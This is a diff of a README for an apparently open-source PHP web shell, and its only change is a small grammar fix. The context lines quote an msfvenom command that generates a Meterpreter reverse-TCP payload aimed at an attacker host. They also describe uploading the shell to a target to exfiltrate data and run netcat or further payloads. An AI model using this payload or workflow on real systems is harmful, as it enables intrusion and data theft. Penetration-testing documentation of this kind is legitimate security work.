@@ -23,7 +23,7 @@ venom.exe : <code>sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=(ATTACK
 
 <p>Next, upload the nsscmdshell.php file to the target. Please note that gaining access to the target is beyond the scope of this writing and your responsibility to establish in a manner consistent with established law.  This tool is intended to be used for on target enumeration to gather and exfiltrate information and then to upload and execute tools such as netcat or msvenom payload for further access to the target. </p>
 
-<p>Once the nsscmdshell is uploaded, typing valid commands into the command input or click the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.</p>
+<p>Once the nsscmdshell is uploaded, typing valid commands into the command input or clicking the various cmd buttons will display the results in a windows command prompt style below the nsscmdshell interface.</p>
 <img src="https://github.com/kaotickj/The-Not-So-Simple-PHP-Command-Shell/blob/main/img/nsscmdshell-output.png" />
 <p>The upload and download options are self explanatory, but just to avoid any confusion: <br><br>
 If using the select field, choose your file and click "upload". files linked in the select field options need to be present at the web root&sup;1 at the ip address and port in lines 10 and 11 of nsscmdshell.php. <br>
